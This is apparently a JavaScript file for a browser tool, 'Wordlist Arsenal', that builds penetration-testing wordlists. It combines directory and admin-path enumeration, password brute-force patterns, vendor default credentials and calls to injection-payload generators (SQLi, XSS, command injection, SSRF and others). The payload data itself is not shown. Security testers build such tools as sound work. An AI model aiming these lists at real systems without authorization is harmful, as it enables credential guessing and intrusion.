
// Wordlist Arsenal - Advanced Cybersecurity Tool by 0x0806
// Global Variables
let currentWordlist = [];
let generationHistory = [];
let appStats = {
    totalGenerated: 0,
    totalSessions: 1,
    totalDownloads: 0,
    mostUsedGenerator: 'enumeration'
};

// Initialize Application
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
    setupEventListeners();
    loadFromLocalStorage();
    updateStats();
});

// Initialize Application
function initializeApp() {
    // Set initial session
    appStats.totalSessions = parseInt(localStorage.getItem('totalSessions') || '0') + 1;
    localStorage.setItem('totalSessions', appStats.totalSessions);
    
    // Show welcome toast
    showToast('Welcome to Wordlist Arsenal! 🛡️', 'success');
    
    // Initialize drag and drop
    initializeDragDrop();

    // Load quick action handlers
    initializeQuickActions();

    // Add Select All / Select None controls to each generator panel
    initializePanelSelectControls();
}

// Inject per-panel "Select All / Select None" controls next to each generator title
function initializePanelSelectControls() {
    document.querySelectorAll('.generator-panel').forEach(panel => {
        const h2 = panel.querySelector('h2');
        if (!h2 || panel.querySelector('.panel-select-controls')) return;

        const controls = document.createElement('div');
        controls.className = 'panel-select-controls';
        controls.innerHTML = `
            <button type="button" class="select-link" data-action="all">Select All</button>
            <span class="select-sep">/</span>
            <button type="button" class="select-link" data-action="none">Select None</button>
        `;

        h2.insertAdjacentElement('afterend', controls);

        controls.querySelectorAll('.select-link').forEach(btn => {
            btn.addEventListener('click', () => {
                const checked = btn.dataset.action === 'all';
                panel.querySelectorAll('input[type="checkbox"]').forEach(cb => { cb.checked = checked; });
            });
        });
    });
}

// Setup Event Listeners
function setupEventListeners() {
    // Tab switching
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.addEventListener('click', () => switchTab(btn.dataset.tab));
    });
    
    // File input
    document.getElementById('fileInput').addEventListener('change', handleFileUpload);
    
    // Modal close on background click
    document.getElementById('helpModal').addEventListener('click', (e) => {
        if (e.target === e.currentTarget) hideHelp();
    });
    
    // Keyboard shortcuts
    document.addEventListener('keydown', handleKeyboardShortcuts);

    // Results toolbar: sort and filter
    const sortSelect = document.getElementById('resultsSort');
    if (sortSelect) {
        sortSelect.addEventListener('change', () => applySortOrder(sortSelect.value));
    }

    const filterBtn = document.getElementById('applyFilterBtn');
    if (filterBtn) {
        filterBtn.addEventListener('click', applyResultsFilter);
    }

    const filterInput = document.getElementById('resultsFilter');
    if (filterInput) {
        filterInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') applyResultsFilter();
        });
    }

    // Keyboard accessibility for the help FAB
    const fab = document.querySelector('.fab');
    if (fab) {
        fab.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' || e.key === ' ') {
                e.preventDefault();
                showHelp();
            }
        });
    }
}

// Tab Switching
function switchTab(tabName) {
    // Update active tab button
    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
    document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');
    
    // Update active panel
    document.querySelectorAll('.generator-panel').forEach(panel => panel.classList.remove('active'));
    document.getElementById(tabName).classList.add('active');
}

// Initialize Drag and Drop
function initializeDragDrop() {
    const uploadZone = document.getElementById('uploadZone');
    
    uploadZone.addEventListener('dragover', (e) => {
        e.preventDefault();
        uploadZone.classList.add('dragover');
    });
    
    uploadZone.addEventListener('dragleave', () => {
        uploadZone.classList.remove('dragover');
    });
    
    uploadZone.addEventListener('drop', (e) => {
        e.preventDefault();
        uploadZone.classList.remove('dragover');
        const files = e.dataTransfer.files;
        handleFileUpload({ target: { files } });
    });
    
    uploadZone.addEventListener('click', () => {
        document.getElementById('fileInput').click();
    });
}

// File Upload Handler
function handleFileUpload(event) {
    const files = Array.from(event.target.files || []);
    files.forEach(file => {
        const reader = new FileReader();
        reader.onload = (e) => {
            const content = e.target.result;
            analyzeWordlist(content, file.name);
        };
        reader.onerror = () => {
            showToast(`Failed to read ${file.name}`, 'error');
        };
        reader.readAsText(file);
    });
    // Reset the input so the same file can be re-selected and re-analyzed
    const fileInput = document.getElementById('fileInput');
    if (fileInput) fileInput.value = '';
}

// Analyze Uploaded Wordlist
function analyzeWordlist(content, filename) {
    const words = content.split('\n').filter(word => word.trim());
    const stats = calculateWordlistStats(words);
    
    showToast(`Analyzed ${filename}: ${stats.count} words, ${stats.unique} unique`, 'success');
    
    // Add to history
    addToHistory({
        type: 'File Analysis',
        filename,
        stats,
        timestamp: new Date().toISOString()
    });
}

// Quick Actions
function initializeQuickActions() {
    document.querySelectorAll('.quick-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const generator = btn.dataset.generator;
            executeQuickAction(generator);
        });
    });
}

function executeQuickAction(generator) {
    showProgress();
    
    setTimeout(() => {
        let wordlist = [];
        
        switch(generator) {
            case 'common-passwords':
                wordlist = generateCommonPasswords();
                break;
            case 'web-dirs':
                wordlist = generateWebDirectories();
                break;
            case 'usernames':
                wordlist = generateCommonUsernames();
                break;
            case 'subdomains':
                wordlist = generateSubdomains();
                break;
        }
        
        displayResults(wordlist, `Quick Action: ${generator}`);
        hideProgress();
    }, 500);
}

// The Ultimate Wordlist: combines every generator and data source in the
// app - enumeration, credentials, usernames, brute-force patterns, hybrid
// mutations, API/web-tech paths, and every security payload category -
// into one massive, deduplicated wordlist.
function generateUltimateWordlist() {
    const btn = document.getElementById('ultimateBtn');
    if (btn) {
        btn.disabled = true;
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Generating Ultimate Wordlist...';
    }
    showProgress();

    setTimeout(() => {
        let wordlist = [];

        // --- Recon / Enumeration ---
        wordlist.push(
            ...getCommonDirectories(),
            ...getAdminPaths(),
            ...getBackupFiles(),
            ...getConfigFiles(),
            ...getSecretsWordlist(),
            ...getCloudBucketNames(),
            ...getParameterNames(),
            ...generateWebDirectories(),
            ...generateSubdomains()
        );

        // --- Passwords ---
        wordlist.push(
            ...generateCommonPasswords(),
            ...getKeyboardPatterns(),
            ...generateDatePatterns(),
            ...getNumericPatterns(4, 8)
        );

        // --- Default credentials (all vendors) ---
        const creds = [
            ...getRouterCredentials(),
            ...getDatabaseCredentials(),
            ...getWebCredentials(),
            ...getOSCredentials()
        ];
        creds.forEach(cred => {
            wordlist.push(`${cred.username}:${cred.password}`);
            if (cred.username) wordlist.push(cred.username);
            if (cred.password) wordlist.push(cred.password);
        });

        // --- Usernames ---
        wordlist.push(...generateCommonUsernames());

        // --- Hybrid mutations against a curated high-value base list ---
        const ultimateBase = ['admin', 'password', 'welcome', 'root', 'test', 'user', 'login', 'secret', 'master', 'letmein'];
        const currentYear = new Date().getFullYear();
        ultimateBase.forEach(baseWord => {
            wordlist.push(baseWord, toLeetSpeak(baseWord), capitalizeFirst(baseWord), baseWord.toUpperCase());
            for (let i = 0; i <= 99; i++) {
                wordlist.push(`${baseWord}${i}`);
            }
            for (let year = 2015; year <= currentYear; year++) {
                wordlist.push(`${baseWord}${year}`);
            }
            ['!', '@', '#', '$', '123'].forEach(suffix => wordlist.push(`${baseWord}${suffix}`));
        });

        // --- API endpoints & web technology paths ---
        wordlist.push(
            ...getRESTEndpoints(), ...getGraphQLEndpoints(), ...getSOAPEndpoints(), ...getWebhookEndpoints(),
            ...getWordPressPaths(), ...getDrupalPaths(), ...getJoomlaPaths(), ...getMagentoPaths(),
            ...getApachePaths(), ...getNginxPaths(), ...getTomcatPaths(), ...getIISPaths(),
            ...getLaravelPaths(), ...getDjangoFlaskPaths(), ...getSpringPaths(),
            ...getExpressPaths(), ...getRailsPaths(), ...getAspNetPaths()
        );

        // --- Every security payload category, every variant ---
        const allOn = { basic: true, advanced: true, bypass: true, encoded: true };
        wordlist.push(
            ...getSQLInjectionPayloads(allOn),
            ...getXSSPayloads(allOn),
            ...getLFIPayloads(allOn),
            ...getRFIPayloads(allOn),
            ...getCommandInjectionPayloads(allOn),
            ...getXXEPayloads(allOn),
            ...getSSRFPayloads(allOn),
            ...getNoSQLInjectionPayloads(allOn),
            ...getSSTIPayloads(allOn),
            ...getOpenRedirectPayloads(allOn)
        );

        displayResults(wordlist, '🔥 ULTIMATE Combined Wordlist');

        if (btn) {
            btn.disabled = false;
            btn.innerHTML = '<i class="fas fa-bolt"></i> Generate Ultimate Wordlist';
        }
        hideProgress();
    }, 50);
}

// Generator Functions
function generateEnumeration() {
    const config = {
        common: document.getElementById('enum-common').checked,
        admin: document.getElementById('enum-admin').checked,
        backup: document.getElementById('enum-backup').checked,
        config: document.getElementById('enum-config').checked,
        secrets: document.getElementById('enum-secrets').checked,
        cloud: document.getElementById('enum-cloud').checked,
        params: document.getElementById('enum-params').checked,
        extensions: document.getElementById('enum-extensions').value.split(',').map(ext => ext.trim()).filter(ext => ext),
        custom: document.getElementById('enum-custom').value.split('\n').filter(path => path.trim())
    };

    let wordlist = [];

    if (config.common) {
        wordlist.push(...getCommonDirectories());
    }

    if (config.admin) {
        wordlist.push(...getAdminPaths());
    }

    if (config.backup) {
        wordlist.push(...getBackupFiles());
    }

    if (config.config) {
        wordlist.push(...getConfigFiles());
    }

    if (config.secrets) {
        wordlist.push(...getSecretsWordlist());
    }

    if (config.cloud) {
        wordlist.push(...getCloudBucketNames());
    }

    if (config.params) {
        wordlist.push(...getParameterNames());
    }

    // Add extensions
    if (config.extensions.length > 0) {
        const baseWords = [...wordlist];
        config.extensions.forEach(ext => {
            baseWords.forEach(word => {
                wordlist.push(`${word}.${ext}`);
            });
        });
    }
    
    // Add custom paths
    wordlist.push(...config.custom);
    
    displayResults(wordlist, 'Web Discovery Enumeration');
}

function generateBruteForce() {
    const config = {
        common: document.getElementById('bf-common').checked,
        numeric: document.getElementById('bf-numeric').checked,
        keyboard: document.getElementById('bf-keyboard').checked,
        dates: document.getElementById('bf-dates').checked,
        minLength: parseInt(document.getElementById('bf-min').value),
        maxLength: parseInt(document.getElementById('bf-max').value),
        lowercase: document.getElementById('bf-lowercase').checked,
        uppercase: document.getElementById('bf-uppercase').checked,
        numbers: document.getElementById('bf-numbers').checked,
        special: document.getElementById('bf-special').checked
    };
    
    let wordlist = [];
    
    if (config.common) {
        wordlist.push(...generateCommonPasswords());
    }

    if (config.numeric) {
        wordlist.push(...getNumericPatterns(config.minLength, config.maxLength));
    }
    
    if (config.keyboard) {
        wordlist.push(...getKeyboardPatterns());
    }
    
    if (config.dates) {
        wordlist.push(...generateDatePatterns());
    }
    
    // Generate character combinations
    if (config.lowercase || config.uppercase || config.numbers || config.special) {
        wordlist.push(...generateCharacterCombinations(config));
    }
    
    displayResults(wordlist, 'Password Brute Force');
}

function generateCredentials() {
    const config = {
        routers: document.getElementById('cred-routers').checked,
        databases: document.getElementById('cred-databases').checked,
        web: document.getElementById('cred-web').checked,
        os: document.getElementById('cred-os').checked,
        format: document.getElementById('cred-format').value,
        vendor: document.getElementById('cred-vendor').value.toLowerCase().trim()
    };
    
    let credentials = [];
    
    if (config.routers) {
        credentials.push(...getRouterCredentials());
    }
    
    if (config.databases) {
        credentials.push(...getDatabaseCredentials());
    }
    
    if (config.web) {
        credentials.push(...getWebCredentials());
    }
    
    if (config.os) {
        credentials.push(...getOSCredentials());
    }
    
    // Filter by vendor if specified
    if (config.vendor) {
        credentials = credentials.filter(cred => 
            cred.vendor && cred.vendor.toLowerCase().includes(config.vendor)
        );
    }
    
    // Format output
    const wordlist = credentials.map(cred => {
        switch(config.format) {
            case 'user:pass':
                return `${cred.username}:${cred.password}`;
            case 'user pass':
                return `${cred.username} ${cred.password}`;
            case 'user/pass':
                return `${cred.username}/${cred.password}`;
            case 'json':
                return JSON.stringify(cred);
            default:
                return `${cred.username}:${cred.password}`;
        }
    });
    
    displayResults(wordlist, 'Default Credentials');
}

function generateUsernames() {
    const config = {
        names: document.getElementById('user-names').value.split('\n').filter(name => name.trim()),
        firstname: document.getElementById('user-firstname').checked,
        lastname: document.getElementById('user-lastname').checked,
        firstlast: document.getElementById('user-firstlast').checked,
        flast: document.getElementById('user-flast').checked,
        numbers: document.getElementById('user-numbers').checked,
        years: document.getElementById('user-years').checked,
        common: document.getElementById('user-common').checked,
        suffixes: document.getElementById('user-suffixes').value.split(',').map(s => s.trim()).filter(s => s)
    };
    
    let wordlist = [];
    
    if (config.common) {
        wordlist.push(...generateCommonUsernames());
    }
    
    config.names.forEach(name => {
        const parts = name.trim().split(/\s+/);
        if (parts.length >= 2) {
            const first = parts[0].toLowerCase();
            const last = parts[parts.length - 1].toLowerCase();
            
            if (config.firstname) wordlist.push(first);
            if (config.lastname) wordlist.push(last);
            if (config.firstlast) wordlist.push(`${first}.${last}`);
            if (config.flast) wordlist.push(`${first[0]}.${last}`);
            
            // Add mutations
            if (config.numbers) {
                for (let i = 1; i <= 99; i++) {
                    wordlist.push(`${first}${i}`);
                    wordlist.push(`${last}${i}`);
                }
            }
            
            if (config.years) {
                for (let year = 1980; year <= 2024; year++) {
                    wordlist.push(`${first}${year}`);
                    wordlist.push(`${last}${year}`);
                }
            }
            
            // Add custom suffixes
            config.suffixes.forEach(suffix => {
                wordlist.push(`${first}${suffix}`);
                wordlist.push(`${last}${suffix}`);
            });
        }
    });
    
    displayResults(wordlist, 'Username Generation');
}

function generatePatterns() {
    const config = {
        rules: document.getElementById('pattern-rules').value.split('\n').filter(rule => rule.trim()),
        words: document.getElementById('pattern-words').value.split('\n').filter(word => word.trim()),
        iterations: parseInt(document.getElementById('pattern-iterations').value)
    };
    
    let wordlist = [];
    
    config.rules.forEach(rule => {
        for (let i = 0; i < config.iterations; i++) {
            const generated = generateFromPattern(rule, config.words);
            if (generated) wordlist.push(generated);
        }
    });
    
    displayResults(wordlist, 'Custom Patterns');
}

function generateHybrid() {
    const config = {
        base: document.getElementById('hybrid-base').value.split('\n').filter(word => word.trim()),
        prepend: document.getElementById('hybrid-prepend').checked,
        append: document.getElementById('hybrid-append').checked,
        years: document.getElementById('hybrid-years').checked,
        special: document.getElementById('hybrid-special').checked,
        leet: document.getElementById('hybrid-leet').checked,
        case: document.getElementById('hybrid-case').checked,
        reverse: document.getElementById('hybrid-reverse').checked,
        custom: document.getElementById('hybrid-custom').value.split(',').map(s => s.trim()).filter(s => s)
    };
    
    let wordlist = [...config.base];
    
    config.base.forEach(word => {
        const baseWord = word.trim();
        
        if (config.prepend) {
            for (let i = 0; i <= 999; i++) {
                wordlist.push(`${i}${baseWord}`);
            }
        }
        
        if (config.append) {
            for (let i = 0; i <= 999; i++) {
                wordlist.push(`${baseWord}${i}`);
            }
        }
        
        if (config.years) {
            for (let year = 1980; year <= 2024; year++) {
                wordlist.push(`${baseWord}${year}`);
            }
        }
        
        if (config.special) {
            const specialChars = ['!', '@', '#', '$', '%', '^', '&', '*'];
            specialChars.forEach(char => {
                wordlist.push(`${baseWord}${char}`);
                wordlist.push(`${char}${baseWord}`);
            });
        }
        
        if (config.leet) {
            wordlist.push(toLeetSpeak(baseWord));
        }
        
        if (config.case) {
            wordlist.push(baseWord.toUpperCase());
            wordlist.push(capitalizeFirst(baseWord));
        }
        
        if (config.reverse) {
            wordlist.push(baseWord.split('').reverse().join(''));
        }
        
        config.custom.forEach(addition => {
            wordlist.push(`${baseWord}${addition}`);
            wordlist.push(`${addition}${baseWord}`);
        });
    });
    
    displayResults(wordlist, 'Hybrid Combinations');
}

function generateAPI() {
    const config = {
        rest: document.getElementById('api-rest').checked,
        graphql: document.getElementById('api-graphql').checked,
        soap: document.getElementById('api-soap').checked,
        webhooks: document.getElementById('api-webhooks').checked,
        get: document.getElementById('api-get').checked,
        post: document.getElementById('api-post').checked,
        put: document.getElementById('api-put').checked,
        delete: document.getElementById('api-delete').checked
    };
    
    let wordlist = [];
    
    if (config.rest) {
        wordlist.push(...getRESTEndpoints());
    }
    
    if (config.graphql) {
        wordlist.push(...getGraphQLEndpoints());
    }
    
    if (config.soap) {
        wordlist.push(...getSOAPEndpoints());
    }
    
    if (config.webhooks) {
        wordlist.push(...getWebhookEndpoints());
    }
    
    displayResults(wordlist, 'API Endpoints');
}

function generateWebTech() {
    const config = {
        wordpress: document.getElementById('tech-wordpress').checked,
        drupal: document.getElementById('tech-drupal').checked,
        joomla: document.getElementById('tech-joomla').checked,
        magento: document.getElementById('tech-magento').checked,
        apache: document.getElementById('tech-apache').checked,
        nginx: document.getElementById('tech-nginx').checked,
        tomcat: document.getElementById('tech-tomcat').checked,
        iis: document.getElementById('tech-iis').checked,
        laravel: document.getElementById('tech-laravel').checked,
        djangoflask: document.getElementById('tech-djangoflask').checked,
        spring: document.getElementById('tech-spring').checked,
        express: document.getElementById('tech-express').checked,
        rails: document.getElementById('tech-rails').checked,
        aspnet: document.getElementById('tech-aspnet').checked
    };

    let wordlist = [];

    if (config.wordpress) {
        wordlist.push(...getWordPressPaths());
    }

    if (config.drupal) {
        wordlist.push(...getDrupalPaths());
    }

    if (config.joomla) {
        wordlist.push(...getJoomlaPaths());
    }

    if (config.magento) {
        wordlist.push(...getMagentoPaths());
    }

    if (config.apache) {
        wordlist.push(...getApachePaths());
    }

    if (config.nginx) {
        wordlist.push(...getNginxPaths());
    }

    if (config.tomcat) {
        wordlist.push(...getTomcatPaths());
    }

    if (config.iis) {
        wordlist.push(...getIISPaths());
    }

    if (config.laravel) {
        wordlist.push(...getLaravelPaths());
    }

    if (config.djangoflask) {
        wordlist.push(...getDjangoFlaskPaths());
    }

    if (config.spring) {
        wordlist.push(...getSpringPaths());
    }

    if (config.express) {
        wordlist.push(...getExpressPaths());
    }

    if (config.rails) {
        wordlist.push(...getRailsPaths());
    }

    if (config.aspnet) {
        wordlist.push(...getAspNetPaths());
    }

    displayResults(wordlist, 'Web Technology Paths');
}

function generateSecurity() {
    const config = {
        sqli: document.getElementById('sec-sqli').checked,
        xss: document.getElementById('sec-xss').checked,
        lfi: document.getElementById('sec-lfi').checked,
        rfi: document.getElementById('sec-rfi').checked,
        cmdi: document.getElementById('sec-cmdi').checked,
        xxe: document.getElementById('sec-xxe').checked,
        ssrf: document.getElementById('sec-ssrf').checked,
        nosqli: document.getElementById('sec-nosqli').checked,
        ssti: document.getElementById('sec-ssti').checked,
        openredirect: document.getElementById('sec-openredirect').checked,
        basic: document.getElementById('sec-basic').checked,
        advanced: document.getElementById('sec-advanced').checked,
        bypass: document.getElementById('sec-bypass').checked,
        encoded: document.getElementById('sec-encoded').checked
    };

    let wordlist = [];

    if (config.sqli) {
        wordlist.push(...getSQLInjectionPayloads(config));
    }

    if (config.xss) {
        wordlist.push(...getXSSPayloads(config));
    }

    if (config.lfi) {
        wordlist.push(...getLFIPayloads(config));
    }

    if (config.rfi) {
        wordlist.push(...getRFIPayloads(config));
    }

    if (config.cmdi) {
        wordlist.push(...getCommandInjectionPayloads(config));
    }

    if (config.xxe) {
        wordlist.push(...getXXEPayloads(config));
    }

    if (config.ssrf) {
        wordlist.push(...getSSRFPayloads(config));
    }

    if (config.nosqli) {
        wordlist.push(...getNoSQLInjectionPayloads(config));
    }

    if (config.ssti) {
        wordlist.push(...getSSTIPayloads(config));
    }

    if (config.openredirect) {
        wordlist.push(...getOpenRedirectPayloads(config));
    }

    displayResults(wordlist, 'Security Testing Payloads');
}

// Utility Functions
function generateFromPattern(pattern, words) {
    let result = pattern;
    
    // Replace placeholders
    result = result.replace(/@l/g, () => getRandomChar('abcdefghijklmnopqrstuvwxyz'));
    result = result.replace(/@u/g, () => getRandomChar('ABCDEFGHIJKLMNOPQRSTUVWXYZ'));
    result = result.replace(/@d/g, () => getRandomChar('0123456789'));
    result = result.replace(/@s/g, () => getRandomChar('!@#$%^&*()_+-=[]{}|;:,.<>?'));
    result = result.replace(/@w/g, () => words[Math.floor(Math.random() * words.length)] || '');
    
    return result;
}

function getRandomChar(charset) {
    return charset[Math.floor(Math.random() * charset.length)];
}

function toLeetSpeak(word) {
    const leetMap = {
        'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7', 'l': '1'
    };
    return word.toLowerCase().split('').map(char => leetMap[char] || char).join('');
}

function capitalizeFirst(word) {
    return word.charAt(0).toUpperCase() + word.slice(1).toLowerCase();
}

function calculateWordlistStats(words) {
    const unique = [...new Set(words)];
    const totalLength = words.join('').length;
    const avgLength = words.length > 0 ? (totalLength / words.length).toFixed(1) : 0;
    
    return {
        count: words.length,
        unique: unique.length,
        size: new Blob([words.join('\n')]).size,
        avgLength: avgLength
    };
}

const MAX_WORDLIST_SIZE = 1000000;

// Renders currentWordlist into the results panel without touching history/stats.
// Used both by displayResults() and by the sort/filter toolbar.
function renderCurrentWordlist() {
    const stats = calculateWordlistStats(currentWordlist);

    document.getElementById('resultsTextarea').value = currentWordlist.join('\n');
    document.getElementById('wordCount').textContent = stats.count.toLocaleString();
    document.getElementById('fileSize').textContent = formatBytes(stats.size);
    document.getElementById('uniqueCount').textContent = stats.unique.toLocaleString();
    document.getElementById('avgLength').textContent = stats.avgLength;

    return stats;
}

function displayResults(wordlist, generatorName) {
    let deduped = [...new Set(wordlist)]; // Remove duplicates
    let truncated = false;

    if (deduped.length > MAX_WORDLIST_SIZE) {
        deduped = deduped.slice(0, MAX_WORDLIST_SIZE);
        truncated = true;
    }

    currentWordlist = deduped;
    const stats = renderCurrentWordlist();

    // Reset any active sort/filter UI state for the new result set
    const sortSelect = document.getElementById('resultsSort');
    if (sortSelect) sortSelect.value = 'none';
    const filterInput = document.getElementById('resultsFilter');
    if (filterInput) filterInput.value = '';

    // Update global stats
    appStats.totalGenerated += stats.count;
    updateStats();

    // Add to history
    addToHistory({
        type: generatorName,
        count: stats.count,
        timestamp: new Date().toISOString(),
        wordlist: currentWordlist.slice(0, 100) // Store first 100 for preview
    });

    if (truncated) {
        showToast(`Generated ${stats.count.toLocaleString()} words (truncated to ${MAX_WORDLIST_SIZE.toLocaleString()} max) for ${generatorName}`, 'info');
    } else {
        showToast(`Generated ${stats.count} words for ${generatorName}`, 'success');
    }
}

// Re-sorts the current wordlist in place (does not affect history/stats)
function applySortOrder(order) {
    if (currentWordlist.length === 0) return;

    switch (order) {
        case 'az':
            currentWordlist.sort((a, b) => a.localeCompare(b));
            break;
        case 'za':
            currentWordlist.sort((a, b) => b.localeCompare(a));
            break;
        case 'len-asc':
            currentWordlist.sort((a, b) => a.length - b.length);
            break;
        case 'len-desc':
            currentWordlist.sort((a, b) => b.length - a.length);
            break;
        default:
            return; // 'none' - leave as-is (can't recover original order after this point)
    }

    renderCurrentWordlist();
}

// Keeps only lines containing the filter text (case-insensitive); permanently narrows currentWordlist
function applyResultsFilter() {
    const filterInput = document.getElementById('resultsFilter');
    const term = filterInput ? filterInput.value.trim().toLowerCase() : '';

    if (!term) {
        showToast('Enter text to filter by first', 'error');
        return;
    }

    if (currentWordlist.length === 0) {
        showToast('No wordlist to filter', 'error');
        return;
    }

    const before = currentWordlist.length;
    currentWordlist = currentWordlist.filter(word => word.toLowerCase().includes(term));
    renderCurrentWordlist();
    showToast(`Kept ${currentWordlist.length.toLocaleString()} of ${before.toLocaleString()} words matching "${term}"`, 'success');
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function showProgress() {
    const progressBar = document.getElementById('progressBar');
    const progressFill = progressBar.querySelector('.progress-fill');
    
    progressBar.style.display = 'block';
    progressFill.style.width = '0%';
    
    let width = 0;
    const interval = setInterval(() => {
        width += 2;
        progressFill.style.width = width + '%';
        if (width >= 100) {
            clearInterval(interval);
        }
    }, 10);
}

function hideProgress() {
    setTimeout(() => {
        document.getElementById('progressBar').style.display = 'none';
    }, 500);
}

// Action Functions
function copyToClipboard() {
    const textarea = document.getElementById('resultsTextarea');

    if (!textarea.value) {
        showToast('No wordlist to copy', 'error');
        return;
    }

    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(textarea.value).then(() => {
            showToast('Wordlist copied to clipboard!', 'success');
        }).catch(() => {
            fallbackCopy(textarea);
        });
    } else {
        fallbackCopy(textarea);
    }
}

function fallbackCopy(textarea) {
    try {
        textarea.select();
        document.execCommand('copy');
        showToast('Wordlist copied to clipboard!', 'success');
    } catch (err) {
        showToast('Failed to copy to clipboard', 'error');
    } finally {
        window.getSelection().removeAllRanges();
    }
}

function downloadWordlist() {
    if (currentWordlist.length === 0) {
        showToast('No wordlist to download', 'error');
        return;
    }

    const formatSelect = document.getElementById('exportFormat');
    const format = formatSelect ? formatSelect.value : 'txt';

    let content, mimeType, extension;

    switch (format) {
        case 'json':
            content = JSON.stringify(currentWordlist, null, 2);
            mimeType = 'application/json';
            extension = 'json';
            break;
        case 'csv':
            content = 'word\n' + currentWordlist.map(w => `"${String(w).replace(/"/g, '""')}"`).join('\n');
            mimeType = 'text/csv';
            extension = 'csv';
            break;
        default:
            content = currentWordlist.join('\n');
            mimeType = 'text/plain';
            extension = 'txt';
    }

    const blob = new Blob([content], { type: mimeType });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');

    a.href = url;
    a.download = `wordlist_${new Date().getTime()}.${extension}`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);

    appStats.totalDownloads++;
    updateStats();
    showToast(`Wordlist downloaded as ${extension.toUpperCase()}!`, 'success');
}

function saveToHistory() {
    if (currentWordlist.length === 0) {
        showToast('No wordlist to save', 'error');
        return;
    }
    
    const historyItem = {
        type: 'Manual Save',
        count: currentWordlist.length,
        timestamp: new Date().toISOString(),
        wordlist: currentWordlist
    };
    
    addToHistory(historyItem);
    showToast('Wordlist saved to history!', 'success');
}

function addToHistory(item) {
    generationHistory.unshift(item);
    if (generationHistory.length > 50) {
        generationHistory.pop();
    }
    
    updateHistoryDisplay();
    saveToLocalStorage();
}

function escapeHTML(str) {
    return String(str ?? '')
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

function updateHistoryDisplay() {
    const historyList = document.getElementById('historyList');

    if (generationHistory.length === 0) {
        historyList.innerHTML = '<div class="history-empty">No history yet</div>';
        return;
    }

    historyList.innerHTML = generationHistory.slice(0, 10).map((item, index) => `
        <div class="history-item" data-index="${index}">
            <div class="history-item-title">${escapeHTML(item.type)}</div>
            <div class="history-item-meta">
                ${item.count ? `${item.count} words • ` : ''}
                ${new Date(item.timestamp).toLocaleString()}
            </div>
        </div>
    `).join('');

    historyList.querySelectorAll('.history-item').forEach(el => {
        el.addEventListener('click', () => loadFromHistory(parseInt(el.dataset.index, 10)));
    });
}

function loadFromHistory(index) {
    const item = generationHistory[index];
    if (item && item.wordlist) {
        if (item.wordlist.length < item.count) {
            showToast(`Note: only the first ${item.wordlist.length} of ${item.count} words were stored in history`, 'info');
        }
        currentWordlist = [...item.wordlist];
        displayResults(currentWordlist, `From History: ${item.type}`);
    } else {
        showToast('No wordlist data available for this history item', 'error');
    }
}

function clearHistory() {
    if (generationHistory.length === 0) {
        showToast('History is already empty', 'info');
        return;
    }
    generationHistory = [];
    updateHistoryDisplay();
    saveToLocalStorage();
    showToast('Generation history cleared', 'success');
}

function updateStats() {
    document.getElementById('totalGenerated').textContent = appStats.totalGenerated.toLocaleString();
    document.getElementById('totalSessions').textContent = appStats.totalSessions.toLocaleString();
    document.getElementById('totalDownloads').textContent = appStats.totalDownloads.toLocaleString();
}

function saveToLocalStorage() {
    localStorage.setItem('wordlistArsenalHistory', JSON.stringify(generationHistory));
    localStorage.setItem('wordlistArsenalStats', JSON.stringify(appStats));
}

function loadFromLocalStorage() {
    const savedHistory = localStorage.getItem('wordlistArsenalHistory');
    const savedStats = localStorage.getItem('wordlistArsenalStats');
    
    if (savedHistory) {
        generationHistory = JSON.parse(savedHistory);
        updateHistoryDisplay();
    }
    
    if (savedStats) {
        const stats = JSON.parse(savedStats);
        appStats.totalGenerated = stats.totalGenerated || 0;
        appStats.totalDownloads = stats.totalDownloads || 0;
        updateStats();
    }
}

function showToast(message, type = 'info') {
    const toastContainer = document.getElementById('toastContainer');
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.textContent = message;
    
    toastContainer.appendChild(toast);
    
    setTimeout(() => {
        toast.remove();
    }, 3000);
}

function showHelp() {
    document.getElementById('helpModal').classList.add('active');
}

function hideHelp() {
    document.getElementById('helpModal').classList.remove('active');
}

function handleKeyboardShortcuts(event) {
    if (event.ctrlKey || event.metaKey) {
        switch(event.key) {
            case 'c':
                if (event.target.tagName !== 'INPUT' && event.target.tagName !== 'TEXTAREA') {
                    event.preventDefault();
                    copyToClipboard();
                }
                break;
            case 's':
                event.preventDefault();
                downloadWordlist();
                break;
            case 'h':
                event.preventDefault();
                showHelp();
                break;
        }
    }
    
    if (event.key === 'Escape') {
        hideHelp();
    }
}

// Wordlist Data Sources
function getCommonDirectories() {
    return [
        'admin', 'administrator', 'wp-admin', 'wp-content', 'wp-includes',
        'login', 'dashboard', 'panel', 'control', 'manage', 'manager',
        'assets', 'css', 'js', 'javascript', 'images', 'img', 'uploads', 'files',
        'backup', 'backups', 'bak', 'old', 'archive', 'archives',
        'config', 'configuration', 'settings', 'setup', 'install', 'installation',
        'test', 'testing', 'dev', 'development', 'staging', 'demo', 'preview',
        'api', 'apis', 'v1', 'v2', 'v3', 'rest', 'graphql', 'soap', 'webhook',
        'public', 'private', 'secure', 'protected', 'restricted', 'internal',
        'temp', 'tmp', 'cache', 'logs', 'log', 'debug', 'error', 'errors',
        'docs', 'documentation', 'help', 'support', 'wiki', 'manual',
        'blog', 'news', 'forum', 'community', 'user', 'users', 'profile',
        'account', 'accounts', 'member', 'members', 'client', 'customer',
        'shop', 'store', 'cart', 'checkout', 'payment', 'order', 'orders',
        'search', 'results', 'browse', 'category', 'categories', 'product',
